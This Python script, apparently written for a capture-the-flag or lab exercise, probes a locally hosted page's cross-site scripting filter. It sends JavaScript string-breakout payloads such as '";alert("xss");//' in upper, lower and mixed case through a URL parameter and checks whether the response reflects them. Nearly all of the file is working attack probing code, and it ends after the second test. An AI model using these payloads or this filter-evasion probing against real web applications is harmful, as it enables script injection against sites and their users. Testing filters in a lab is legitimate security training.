import requests
import urllib.parse
import re

target_url = "http://127.0.0.1:32830/page"

def url_encode(s):
    return urllib.parse.quote(s, safe='')

def test_filter_mechanics():
    """Test uppercase vs lowercase to understand the filter mechanics"""
    
    print("="*80)
    print("FILTER MECHANICS TESTING")
    print("="*80)
    print("Goal: Determine if filter blocks uppercase S or any uppercase")
    print()
    
    # Test 1: Lowercase 'xss' (should work if only uppercase blocked)
    print("[TEST 1] Lowercase 'xss' - baseline")
    payload1 = '";alert("xss");//'
    enc1 = url_encode(payload1)
    try:
        url1 = f"{target_url}?name={enc1}"
        r1 = requests.get(url1, timeout=10)
        text1 = r1.text
        
        match = re.search(r'var name = "([^"]*)"', text1)
        if match:
            reflected = match.group(1)
            print(f"Reflected: {reflected}")
            if "xss" in text1.lower():
                print(f"[+] Lowercase 'xss' reflected")
            else:
                print(f"[-] Lowercase not reflected")
        print(f"Length: {len(text1)}")
    except Exception as e:
        print(f"Error: {e}")
    
    print()
    
    # Test 2: Mixed case 'Xss' (test if partial uppercase blocked)
    print("[TEST 2] Mixed case 'Xss'")
    payload2 = '";alert("Xss");//'
    enc2 = url_encode(payload2)
    try:
        url2 = f"{target_url}?name={enc2}"
        r2 = requests.get(url2, timeout=10)
        text2 = r2.text
        
        match = re.search(r'var name = "([^"]*)"', text2)
        if match:
            reflected = match.group(1)
            print(f"Reflected: {reflected}")
            if "Xss" in text2:
                print(f"[+] Mixed case 'Xss' reflected")
            elif "X" in reflected and "ss" in reflected:
                print(f"[+] Partial reflection (split filter?)")
            else:
                print(f"[-] Filter blocked")
        print(f"Length: {len(text2)}")
    except Exception as e:
        print(f"Error: {e}")
    
    print()
    
